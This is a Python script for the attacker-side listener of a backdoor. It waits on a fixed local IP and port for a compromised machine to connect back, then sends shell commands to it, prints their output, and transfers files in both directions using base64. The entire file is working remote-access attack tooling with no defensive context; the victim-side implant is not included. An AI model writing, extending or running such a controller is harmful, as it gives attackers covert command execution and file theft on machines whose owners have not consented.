import socket
import base64

class BackdoorListener:
    def __init__(self, ip, port):
        self.my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.my_listener.bind((ip, port))
        self.my_listener.listen(0)
        print("Listening...")
        (self.my_connection, self.my_address) = self.my_listener.accept()
        print(f"Connected to {str(self.my_address)}")

    def send_command(self, data_to_send):
        self.my_connection.send(data_to_send.encode("utf-8"))
    
    def recieve_data(self):
        return self.my_connection.recv(65536).decode("utf-8")

    def download_file(self, path, content):
        with open(path, "wb") as tf:
            tf.write(base64.b64decode(content))
            return print("Downloaded Successfully!")
        
    def upload_file(self, path):
        try:
            with open(path, "rb") as tf:
                return base64.b64encode(tf.read())
        except:
            return "Error"
        
    def start_connection(self):
        while True:
            command = input("-> ").split()
            try:
                if command[0] == "quit":
                    self.send_command(" ".join(command))
                    self.stop_connection()
                    break
                elif command[0] == "download":
                    self.send_command(" ".join(command))
                    command_output = self.recieve_data()
                    self.download_file(command[2], command_output) if command_output != "Error" else print(command_output)
                elif command[0] == "upload":
                    content = self.upload_file(command[1])
                    if content != "Error":
                        self.send_command(f"{command[0]} {command[2]} {content.decode('utf-8')}")
                        command_output = self.recieve_data()
                        print(command_output)
                    else:
                        print(content)
                else:
                    self.send_command(" ".join(command))
                    print(self.recieve_data())
            except Exception as e:
                print(e)
            
    def stop_connection(self):
        self.my_connection.close()


if __name__ == "__main__":
    listener = BackdoorListener("192.168.1.52", 1234)
    listener.start_connection() 